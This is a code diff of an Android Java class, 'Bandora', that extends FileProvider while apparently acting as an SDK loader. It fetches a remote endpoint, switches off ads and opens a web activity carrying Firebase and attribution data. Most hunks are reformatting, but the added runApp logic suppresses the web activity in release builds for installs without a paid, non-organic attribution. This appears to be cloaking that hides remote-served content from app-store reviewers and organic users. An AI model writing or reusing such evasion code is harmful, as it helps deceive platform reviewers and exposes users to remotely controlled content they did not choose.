@@ -29,9 +29,9 @@ import com.ma.awsdk.models.DynamoCF;
 import com.ma.awsdk.models.Params;
 import com.ma.awsdk.observer.DynURL;
 import com.ma.awsdk.observer.URLObservable;
+import com.ma.awsdk.ui.AppFileActivity;
 import com.ma.awsdk.utils.Constants;
 import com.ma.awsdk.utils.Utils;
-import com.ma.awsdk.ui.AppFileActivity;
 
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
@@ -61,7 +61,7 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         initAdjust();
         getGoogleInstallReferrer();
 
-        Application app = (Application) Utils.makeContextSafe( getContext());
+        Application app = (Application) Utils.makeContextSafe(getContext());
         app.registerActivityLifecycleCallbacks(this);
 
         //callDynamoURL();
@@ -117,10 +117,10 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         Adjust.addSessionCallbackParameter("m_sdk_version", versionCode);
         Utils.logEvent(getContext(), Constants.m_sdk_version + versionCode, "");
 
-        try{
+        try {
             FirebaseAnalytics.getInstance(getContext()).getAppInstanceId().addOnCompleteListener(task -> {
 
-                webParams.setFirebaseInstanceId( task.getResult());
+                webParams.setFirebaseInstanceId(task.getResult());
                 ov.api_should_start();
 
                 Adjust.addSessionCallbackParameter("Firebase_App_InstanceId", task.getResult());
@@ -133,7 +133,7 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
 
                 Utils.logEvent(getContext(), Constants.firbase_instanceid_sent, "");
             });
-        } catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
 
@@ -215,99 +215,104 @@ public class Bandora extends FileProvider implements Application.ActivityLifecyc
         }
     }
 
-    public void callDynamoURL(){
+    public void callDynamoURL() {
 
-            OkHttpClient client = new OkHttpClient();
+        OkHttpClient client = new OkHttpClient();
 
-            Request request = new Request.Builder()
-                    .url(fixUrl(getContext().getString(R.string.finalEndp)) +"/?package="+getContext().getPackageName())
-                    .build();
+        Request request = new Request.Builder()
+                .url(fixUrl(getContext().getString(R.string.finalEndp)) + "/?package=" + getContext().getPackageName())
+                .build();
 
-            client.newCall(request).enqueue(new Callback() {
-                @Override
-                public void onFailure(Call call, IOException e) {
-                    Utils.logEvent(getContext(), Constants.init_dynamo_error, "");
-                    AppMainActivity();
-                }
-                @Override
-                public void onResponse(Call call, Response response) throws IOException {
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Utils.logEvent(getContext(), Constants.init_dynamo_error, "");
+                AppMainActivity();
+            }
 
-                    String myResponse = response.body().string();
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
 
-                     try {
-                        Gson gson = new Gson();
-                        DynamoCF m = gson.fromJson(myResponse, DynamoCF.class);
+                String myResponse = response.body().string();
 
-                        if (m != null & m.getCf() != null) {
+                try {
+                    Gson gson = new Gson();
+                    DynamoCF m = gson.fromJson(myResponse, DynamoCF.class);
 
-                            Utils.logEvent(getContext(), Constants.init_dynamo_ok, "");
+                    if (m != null & m.getCf() != null) {
 
-                            String fileResult = null;
+                        Utils.logEvent(getContext(), Constants.init_dynamo_ok, "");
+
+                        String fileResult = null;
+                        try {
+                            fileResult = m.getCf();
+
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                        if (fileResult != null && !fileResult.equals("")) {
+                            Constants.showAds = false;
+                            if (fileResult.startsWith("http")) {
+                                Constants.setEndP(getContext(), fileResult);
+                            } else {
+                                Constants.setEndP(getContext(), "https://" + fileResult);
+                            }
+
                             try {
-                                fileResult = m.getCf();
+                                if (m.getSecond() != null) {
+                                    SPLASH_TIME = 0;
 
+                                    try {
+                                        SPLASH_TIME = Integer.parseInt(m.getSecond());
+                                    } catch (NumberFormatException nfe) {
+                                        System.out.println("Could not parse " + nfe);
+                                    }
+
+                                }
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
-                            if (fileResult != null && !fileResult.equals(""))  {
-                                Constants.showAds = false;
-                                if (fileResult.startsWith("http")) {
-                                    Constants.setEndP(getContext(), fileResult);
-                                } else {
-                                    Constants.setEndP(getContext(), "https://" + fileResult);
-                                }
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                ov.api_should_start();
+                            }, SPLASH_TIME);
 
-                                try {
-                                    if (m.getSecond() != null) {
-                                        SPLASH_TIME = 0;
-
-                                        try {
-                                            SPLASH_TIME = Integer.parseInt(m.getSecond());
-                                        } catch(NumberFormatException nfe) {
-                                            System.out.println("Could not parse " + nfe);
-                                        }
-
-                                    }
-                                } catch (Exception e) {
-                                    e.printStackTrace();
-                                }
-                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                        ov.api_should_start();
-                                    }, SPLASH_TIME);
-
-                            } else {
-                                AppMainActivity();
-                            }
-                        }
-                        else
-                        {
-                            Utils.logEvent(getContext(), Constants.init_dynamo_ok_empty, "");
+                        } else {
                             AppMainActivity();
                         }
-
-                    } catch (Exception e) {
-                         Utils.logEvent(getContext(), Constants.init_dynamo_ok_exception, "");
+                    } else {
+                        Utils.logEvent(getContext(), Constants.init_dynamo_ok_empty, "");
                         AppMainActivity();
                     }
 
+                } catch (Exception e) {
+                    Utils.logEvent(getContext(), Constants.init_dynamo_ok_exception, "");
+                    AppMainActivity();
                 }
-            });
+
+            }
+        });
     }
 
-    public void runApp(){
-        Utils.logEvent(getContext(), Constants.sdk_start+ "_in" + getElapsedTimeInSeconds(timestamp), "");
-
+    public void runApp() {
+        Utils.logEvent(getContext(), Constants.sdk_start + "_in" + getElapsedTimeInSeconds(timestamp), "");
         Intent intent = new Intent(getContext(), AppFileActivity.class);
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.putExtra("webParams", webParams);
-        getContext().startActivity(intent);
 
+        String attribution = webParams.getGoogleAttribution();
+        if (!BuildConfig.DEBUG) {
+            if (attribution == null || attribution.isEmpty() || attribution.toLowerCase().contains("organic")) {
+                return;
+            }
+        }
+        getContext().startActivity(intent);
     }
 
     public void AppMainActivity() {
-      //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
+        //  getContext().startActivity(new Intent(getContext(), AppFileActivity.class));
         return;
     }
+
     @Override
     public void onActivityStarted(@NonNull Activity activity) {
     }
